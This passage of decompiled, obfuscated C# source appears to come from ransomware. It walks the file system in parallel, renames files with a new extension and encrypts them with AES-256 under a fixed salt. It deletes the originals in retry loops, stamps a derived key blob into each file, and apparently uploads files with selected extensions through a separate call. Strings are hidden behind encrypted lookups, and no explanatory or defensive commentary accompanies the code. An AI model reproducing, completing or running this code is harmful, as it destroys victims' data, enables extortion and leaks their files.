							byte[] array2 = null;
							byte[] byte_2 = laLXjNdfIrlJ.STmRWaBeQYVyn(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
							if (laLXjNdfIrlJ.aOycAYsEuHTjq(WUAqTrQObZUDJY: (!rqILzTAnaGs) ? (AcumuDDlRST ? laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? YcKZGEuitEbIot.sJmvPSqhFwcq(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : YcKZGEuitEbIot.sJmvPSqhFwcq(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), miqsVkLePvjxa: CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, WUAskcktCGjCrN: bytes4))
							{
								goto IL_09a3;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
							}
							catch (Exception)
							{
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09a3;
						}
					}
					continue;
					IL_09a3:
					CS_0024_003C_003E8__locals0.UWBePPalaohE.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.UWBePPalaohE, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new VwdjWlzHHKKh.FxgjJBeAgKI();
			CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg = string_0;
			if (CS_0024_003C_003E8__locals0.nwbGeFCbtFNo.Length != 0)
			{
				string[] nwbGeFCbtFNo = CS_0024_003C_003E8__locals0.nwbGeFCbtFNo;
				int num = 0;
				while (num < nwbGeFCbtFNo.Length)
				{
					string value = nwbGeFCbtFNo[num];
					if (!CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(CS_0024_003C_003E8__locals0.utySFCfMcfJj))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!ngVLNnblfHHw.Contains(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
			{
				if (hbiMFBxXkVIgur == VwdjWlzHHKKh.getString_0(107396815))
				{
					try
					{
						if (QeMFAvXech.PRtgpcDOjtZQp(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
						{
							QeMFAvXech.lJHkFdxPppFD(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg));
				}
				WexLWmlSQyxJV(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				try
				{
					new PEjkbesuAo().YJnTvaOXFymvWeYd(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(VwdjWlzHHKKh.getString_0(107404111) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107404066) + new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length + VwdjWlzHHKKh.getString_0(107404045));
								Console.WriteLine(VwdjWlzHHKKh.getString_0(107404036));
							}
						}
						catch
						{
						}
						AWnjIktergta(RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403963)), VwdjWlzHHKKh.getString_0(107388800) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107388800) + RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403906)) + VwdjWlzHHKKh.getString_0(107388800) + Environment.UserName + VwdjWlzHHKKh.getString_0(107388800) + RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403921)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107404408) + ex2.Message + VwdjWlzHHKKh.getString_0(107396286));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107404295) + ex4.Message + VwdjWlzHHKKh.getString_0(107396286));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_031d_2;
					}
					if (DuwAfCYTUCT == VwdjWlzHHKKh.getString_0(107396815) && new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
							{
								if (vzooNONBAAoJ)
								{
									CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
								}
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107404234) + ex6.Message + VwdjWlzHHKKh.getString_0(107396286));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
						{
							CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg += CS_0024_003C_003E8__locals0.utySFCfMcfJj;
						}
						if (SFDpinVUmMSqKHuE == VwdjWlzHHKKh.getString_0(107396815))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107396821))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length)
										{
											try
											{
												ohJtITMsrrTaVTo.qhGPXbNSyvCayd(VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389872), VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389867), VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389886), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item3) && YzEXDgkVctSKX == VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107397110))
									{
										try
										{
											ohJtITMsrrTaVTo.qhGPXbNSyvCayd(VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389872), VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389867), VwdjWlzHHKKh.FxgjJBeAgKI.getString_0(107389886), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
						string text2 = VwdjWlzHHKKh.getString_0(107389305);
						text2 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : VwdjWlzHHKKh.getString_0(107389305));
						string s = CEfwFkxuuHuowy.CfhzgVmlFFzI(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = laLXjNdfIrlJ.STmRWaBeQYVyn(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
						if (!laLXjNdfIrlJ.aOycAYsEuHTjq(WUAqTrQObZUDJY: (!rqILzTAnaGs) ? (AcumuDDlRST ? laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : YcKZGEuitEbIot.sJmvPSqhFwcq(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), miqsVkLePvjxa: CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, WUAskcktCGjCrN: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (vzooNONBAAoJ)
						{
							CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
						}
						string text3 = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
						string text4 = VwdjWlzHHKKh.getString_0(107389305);
						text4 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : VwdjWlzHHKKh.getString_0(107389305));
						string s2 = CEfwFkxuuHuowy.CfhzgVmlFFzI(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
						{
							if (!qtSCtAyEKwnBa)
							{
								if (!AcumuDDlRST)
								{
									XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM);
								}
								else
								{
									XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!AcumuDDlRST)
									{
										FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
									}
									else
									{
										FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (VLajbDNhoSbf)
									{
										try
										{
											File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107387324) + ex9.Message + VwdjWlzHHKKh.getString_0(107396286));
										}
										catch (Exception)
										{
										}
									}
									uAQgXZmBeIANml++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
								XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107387301), oybyixAEyQBUaM);
							}
							else
							{
								XiqCbtvoxi(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107387301), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!AcumuDDlRST)
								{
									FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
								}
								else
								{
									FvQSVpHgjxqhRPuFc(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + VwdjWlzHHKKh.getString_0(107387324) + ex12.Message + VwdjWlzHHKKh.getString_0(107396286));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								return;
							}
						}
						if (AcumuDDlRST)
						{
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
							{
								hfPzCBDyuj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, bytes2);
							}
							else
							{
								hfPzCBDyuj(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			CS_0024_003C_003E8__locals0.UWBePPalaohE.Remove(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
		});
	}

	private static void YRoXysRBkitV(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (SFDpinVUmMSqKHuE == getString_0(107396798))
					{
						foreach (string item in sAdxWTwIriShHsff)
						{
							if (string_0.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396798))
							{
								if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397087))
							{
								try
								{
									ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107387284)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107387284), getString_0(107389288)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void FvQSVpHgjxqhRPuFc(string zITiIfLOWmQFPKd, string TTKffGLywMfl, byte[] nrbskOBwIQZxUx, byte[] sPrSOTxUEIBAQEm = null)
	{
		try
		{
			if (SFDpinVUmMSqKHuE == getString_0(107396798))
			{
				FileStream fileStream = new FileStream(zITiIfLOWmQFPKd, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in sAdxWTwIriShHsff)
				{
					if (zITiIfLOWmQFPKd.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396798))
					{
						if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), zITiIfLOWmQFPKd);
							}
							catch
							{
							}
						}
					}
					else if (zITiIfLOWmQFPKd.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397087))
					{
						try
						{
							ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), zITiIfLOWmQFPKd);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (zITiIfLOWmQFPKd != TTKffGLywMfl)
		{
			File.Move(zITiIfLOWmQFPKd, TTKffGLywMfl);
			zITiIfLOWmQFPKd = TTKffGLywMfl;
		}
		byte[] bytes = YcKZGEuitEbIot.sJmvPSqhFwcq(File.ReadAllBytes(zITiIfLOWmQFPKd), nrbskOBwIQZxUx, sPrSOTxUEIBAQEm);
		File.WriteAllBytes(zITiIfLOWmQFPKd, bytes);
		ywaYFjHsMFpWdbL++;
	}

	private static void XiqCbtvoxi(string string_0, string string_1, byte[] byte_0)
	{
		UDbEUcMVPQWY CS_0024_003C_003E8__locals0 = new UDbEUcMVPQWY();
		CS_0024_003C_003E8__locals0.eltoobQHQxyj = string_0;
		CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string sIPOkqlVRtqKbWj = CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj;
			FileStream fileStream = new FileStream(sIPOkqlVRtqKbWj, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (FTilkCJiPZSoYC == getString_0(107396798))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.Length > 0)
				{
					if (SFDpinVUmMSqKHuE == getString_0(107396798))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.eltoobQHQxyj, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in sAdxWTwIriShHsff)
						{
							if (CS_0024_003C_003E8__locals0.eltoobQHQxyj.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107396798))
							{
								if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), CS_0024_003C_003E8__locals0.eltoobQHQxyj);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.eltoobQHQxyj.ToLower().EndsWith(item) && YzEXDgkVctSKX == getString_0(107397087))
							{
								try
								{
									ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), CS_0024_003C_003E8__locals0.eltoobQHQxyj);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.eltoobQHQxyj);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.EndsWith(getString_0(107387284)))
					{
						File.Move(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj, CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj.Replace(getString_0(107387284), getString_0(107389288)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj))
							{
								File.Delete(CS_0024_003C_003E8__locals0.sIPOkqlVRtqKbWj);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107387029) + CS_0024_003C_003E8__locals0.eltoobQHQxyj + getString_0(107387307) + ex2.Message + getString_0(107396269));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = fKSEXFuwhxqo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386710)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source2 = sCGElgUFAvuF;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (ZKhoLenETDJl == getString_0(107396798))
		{
			string[] mWvvpEiADk = MWvvpEiADk;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), getString_0(107386672) + string_0 + getString_0(107386695));
				};
			}
			Parallel.ForEach(mWvvpEiADk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!NRobqXdjvopcwE().Contains(getString_0(107387407)))
		{
			iUUVXROQaGoEty(ShXoyCWZDyXwi);
		}
		else
		{
			List<string> source3 = xeIMBaJAxSsDB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					AWnjIktergta(RdzltCKTqMftoSE(uWwQTdHjjsAYSYp(getString_0(107386690))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> efmWSoVDSebqevqR = EfmWSoVDSebqevqR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386665)), string_0);
			};
		}
		Parallel.ForEach(efmWSoVDSebqevqR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386710)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386729)), getString_0(107386672) + string_0 + getString_0(107386695));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		AWnjIktergta(RdzltCKTqMftoSE(uWwQTdHjjsAYSYp(getString_0(107386690))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		AWnjIktergta(RdzltCKTqMftoSE(getString_0(107386665)), string_0);
	}

	static CcLtuTEQJD()
	{
		Strings.CreateGetStringDelegate(typeof(CcLtuTEQJD));
		wUDkdnCGLMOs = getString_0(107389187);
		oybyixAEyQBUaM = null;
		VIsIdhZRykLqTUQDB = getString_0(107397087);
		xtbYgrRCEXRhIt = getString_0(107386616);
		jwBOsivrxmQ = new List<string>();
		rpxCtxXAXaqO = new List<string>();
		sfTwxMnKqH = getString_0(107397087);
		pPYjMJSGlCKrKN = getString_0(107389288);
		MLaZeafODt = getString_0(107389288);
		OXVbUzKTVitWIr = getString_0(107389288);
		tXzockTHFc = getString_0(107397087);
		HBRweUbQOIMdbZZp = 0;
		hbiMFBxXkVIgur = getString_0(107397087);
		joSdEOhiuznF = getString_0(107397087);
		PqJDLaSNaTyq = getString_0(107397087);
		qPJcttYtoGQxk = getString_0(107386635);
		pHrGJqOZIctkX = getString_0(107397087);
		odoeVPlCXvoFQPOL = getString_0(107397087);
		PaFnRkZFdGu = getString_0(107397087);
		KHZEvaaAjnAHLm = getString_0(107397087);
		tAtyTsIAxbjQvxo = new List<string>
		{
			RdzltCKTqMftoSE(getString_0(107386630)),
			RdzltCKTqMftoSE(getString_0(107386581)),
			RdzltCKTqMftoSE(getString_0(107386556)),
			RdzltCKTqMftoSE(getString_0(107386571)),
			RdzltCKTqMftoSE(getString_0(107386514)),
			RdzltCKTqMftoSE(getString_0(107386489)),
			RdzltCKTqMftoSE(getString_0(107386504)),
			RdzltCKTqMftoSE(getString_0(107386959)),
			RdzltCKTqMftoSE(getString_0(107386934)),
			RdzltCKTqMftoSE(getString_0(107386909)),
			RdzltCKTqMftoSE(getString_0(107386924)),
